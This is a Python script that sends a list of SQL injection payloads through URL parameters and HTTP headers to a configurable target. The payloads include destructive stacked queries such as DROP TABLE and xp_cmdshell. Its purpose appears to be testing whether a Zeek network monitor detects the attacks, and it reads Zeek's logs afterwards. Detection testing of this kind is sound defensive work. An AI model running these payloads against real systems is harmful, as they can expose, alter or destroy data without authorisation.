#!/usr/bin/env python3

import http.client
import urllib.parse
import time
import random
import socket
from datetime import datetime

# Target configuration - CHANGE THIS TO YOUR TARGET IP
TARGET_IP = '192.168.1.1'
TARGET_PORT = 80
USE_SSL = False  # Set to True if the target uses HTTPS

# Utility functions
def log(message):
    print(f"[{datetime.now().isoformat()}] {message}")

def verify_connectivity():
    """Verify that we can connect to the target server"""
    log(f"Verifying connectivity to {TARGET_IP}:{TARGET_PORT}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        result = s.connect_ex((TARGET_IP, TARGET_PORT))
        s.close()
        
        if result == 0:
            log(f"✓ Successfully connected to {TARGET_IP}:{TARGET_PORT}")
            return True
        else:
            log(f"✗ Failed to connect to {TARGET_IP}:{TARGET_PORT} (Error code: {result})")
            return False
    except Exception as e:
        log(f"✗ Connection error: {str(e)}")
        return False

def make_request(method, path, headers=None, debug=False):
    if headers is None:
        headers = {}
    
    if debug:
        log(f"Making {method} request to {path}")
        log(f"Headers: {headers}")
    
    # Choose between HTTP and HTTPS
    if USE_SSL:
        import ssl
        conn = http.client.HTTPSConnection(TARGET_IP, TARGET_PORT, timeout=10, context=ssl.create_default_context())
    else:
        conn = http.client.HTTPConnection(TARGET_IP, TARGET_PORT, timeout=10)
    
    try:
        conn.request(method, path, None, headers)  # No body to avoid SNIFFPASS
        response = conn.getresponse()
        data = response.read().decode('utf-8', errors='ignore')
        
        if debug:
            log(f"Response status: {response.status}")
            log(f"Response headers: {response.headers}")
            log(f"Response body (first 200 chars): {data[:200]}")
        
        return {
            'status': response.status,
            'headers': response.headers,
            'body': data
        }
    except Exception as e:
        log(f"Request error: {str(e)}")
        return None
    finally:
        conn.close()

def test_sql_injection_get_only():
    log('Starting SQL Injection detection test (GET requests only, no SNIFFPASS triggers)...')
    
    # SQL injection payloads - AVOIDING ANY PASSWORD-RELATED STRINGS
    sql_payloads = [
        # Basic SQL Injection
        "1' OR '1'='1",
        "1' OR 1=1 -- -",
        "' OR '' = '",
        "' OR 1 -- -",
        "admin' --",
        "admin'/*",
        "' OR 1=1 #",
        
        # UNION-based SQL Injection
        "1' UNION SELECT username,email FROM users -- -",
        "1' UNION SELECT table_name,column_name FROM information_schema.columns -- -",
        "1' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 -- -",
        "1' UNION SELECT @@version,2 -- -",
        
        # Error-based SQL Injection
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) -- -",
        "1' AND updatexml(1, concat(0x7e,(SELECT version()),0x7e), 1) -- -",
        
        # Time-based SQL Injection
        "1' AND SLEEP(1) -- -",
        "1' OR SLEEP(1) -- -",
        "1' AND (SELECT * FROM (SELECT(SLEEP(1)))a) -- -",
        "1' OR BENCHMARK(1000000,MD5(1)) -- -",
        "1' AND BENCHMARK(1000000,MD5(1)) -- -",
        
        # Stacked Queries
        "1'; DROP TABLE users; --",
        "1'; UPDATE users SET email='hacked' WHERE username='admin'; --",
        "1'; INSERT INTO users (username,email) VALUES ('hacker','hacked'); --",
        
        # Boolean-based SQL Injection
        "1' AND 1=1 -- -",
        "1' AND 1=2 -- -",
        "1' AND substring(@@version,1,1)='5' -- -",
        
        # Comment variants
        "1'/**/OR/**/1=1/**/--/**/-",
        "1'--",
        "1'#",
        "1'-- -",
        
        # Case variations
        "1' or '1'='1",
        "1' OR '1'='1",
        "1' oR '1'='1",
        
        # Whitespace variations
        "1'%09OR%091=1%09--%09-",  # Using tabs
        "1'%0AOR%0A1=1%0A--%0A-",  # Using newlines
        
        # Special SQL keywords
        "1' HAVING 1=1 -- -",
        "1' GROUP BY columnnames HAVING 1=1 -- -",
        "1' SELECT * FROM users -- -",
        "1' EXEC xp_cmdshell('dir') -- -",
        "1'; WAITFOR DELAY '0:0:1' -- -"
    ]
    
    # Generic endpoints that might be vulnerable to SQL injection
    # AVOIDING ANY LOGIN/PASSWORD RELATED ENDPOINTS
    endpoints = [
        "/search.php?q=",
        "/products.php?id=",
        "/article.php?id=",
        "/profile.php?user=",
        "/item.php?id=",
        "/category.php?id=",
        "/news.php?id=",
        "/index.php?page=",
        "/view.php?page=",
        "/app/search?query=",
        "/product-details.php?pid=",
        "/catalog.php?cat=",
        "/gallery.php?id=",
        "/content.php?id=",
        "/show.php?id=",
        "/default.php?page=",
        "/site.php?id=",
        "/main.php?id="
    ]
    
    # Use only GET requests to avoid POST data that might trigger SNIFFPASS
    for endpoint in endpoints:
        log(f"Testing endpoint: {endpoint}")
        
        for payload in sql_payloads:
            encoded_payload = urllib.parse.quote(payload)
            
            # GET request
            path = f"{endpoint}{encoded_payload}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            try:
                make_request('GET', path, headers, debug=False)
                log(f"Sent SQL injection (GET): {endpoint} with payload: {payload}")
            except Exception as e:
                log(f"Error sending SQL injection: {str(e)}")
            
            # Also try in headers but AVOID any password-related headers
            header_injection_headers = {
                'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {payload}",
                'X-Forwarded-For': f"127.0.0.1' OR '1'='1",
                'Accept': f"*/* {payload}",
                'Referer': f"http://legit-site.com/{payload}"
                # Avoiding Cookie headers as they might trigger SNIFFPASS
            }
            
            try:
                make_request('GET', '/', header_injection_headers, debug=False)
                log(f"Sent SQL injection in headers with payload: {payload}")
            except Exception as e:
                log(f"Error sending header injection: {str(e)}")
            
            time.sleep(0.1)  # Small delay between requests

def check_zeek_logs():
    """Attempt to check if Zeek is logging properly"""
    log("Checking if Zeek is logging properly...")
    
    try:
        import subprocess
        result = subprocess.run(["sudo", "ls", "-la", "/opt/zeek/logs/current/"], 
                               capture_output=True, text=True)
        log(f"Zeek logs directory contents:\n{result.stdout}")
        
        # Check if notice.log exists and has recent entries
        result = subprocess.run(["sudo", "stat", "/opt/zeek/logs/current/notice.log"], 
                               capture_output=True, text=True)
        log(f"notice.log status:\n{result.stdout}")
        
        # Check last few entries in notice.log
        result = subprocess.run(["sudo", "tail", "/opt/zeek/logs/current/notice.log"], 
                               capture_output=True, text=True)
        log(f"Last entries in notice.log:\n{result.stdout}")
        
        return True
    except Exception as e:
        log(f"Error checking Zeek logs: {str(e)}")
        return False

# Main function
if __name__ == "__main__":
    try:
        # Ask for confirmation before running attacks
        confirm = input(f"Run SQL injection attacks against {TARGET_IP}:{TARGET_PORT}? (y/n): ")
        if confirm.lower() != 'y':
            print("Exiting.")
            exit()
        
        # First verify connectivity
        if not verify_connectivity():
            log("Cannot connect to target. Please check your network settings and target IP/port.")
            exit(1)
        
        # Run the SQL injection test
        test_sql_injection_get_only()
        
        # Check Zeek logs
        log("\nTest completed. Checking Zeek logs...")
        check_zeek_logs()
        
        log("\nSuggestions if no alerts were generated:")
        log("1. Verify Zeek is running: sudo zeekctl status")
        log("2. Check if SQL injection detection is enabled: grep 'detect-sqli' /opt/zeek/share/zeek/site/local.zeek")
        log("3. Try running: sudo zeekctl restart")
        log("4. Check HTTP logs: sudo tail -f /opt/zeek/logs/current/http.log")
        log("5. Verify your target is actually receiving the requests (check web server logs)")
        
    except KeyboardInterrupt:
        log("Script interrupted by user")
    except Exception as e:
        log(f"Unexpected error: {str(e)}")
